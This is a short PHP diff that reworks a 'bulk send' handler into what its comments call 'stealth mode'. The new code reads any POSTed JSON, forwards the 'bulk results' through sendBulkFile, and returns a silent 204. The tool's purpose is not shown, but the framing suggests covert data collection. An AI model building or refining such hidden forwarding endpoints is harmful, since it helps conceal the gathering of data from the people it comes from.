@@ -87,19 +87,18 @@ function sendBulkFile($text) {
 }
 $bulkResults = [];
 
-// ✅ HANDLE BULK SEND (ADD THIS HERE)
-if (isset($_GET['bulk']) && $_GET['bulk'] == 1) {
+// ✅ HANDLE BULK SEND (STEALTH MODE)
+$raw = file_get_contents('php://input');
+$data = json_decode($raw, true);
 
-    $raw = file_get_contents('php://input');
-    $data = json_decode($raw, true);
+if (isset($data['bulk'])) {
 
     if (!empty($data['bulk'])) {
         $finalText = "📦 BULK RESULTS\n\n" . $data['bulk'];
         sendBulkFile($finalText);
     }
 
-    // 🔥 NO RESPONSE (STEALTH)
-    http_response_code(200);
+    http_response_code(204); // silent
     exit;
 }
 
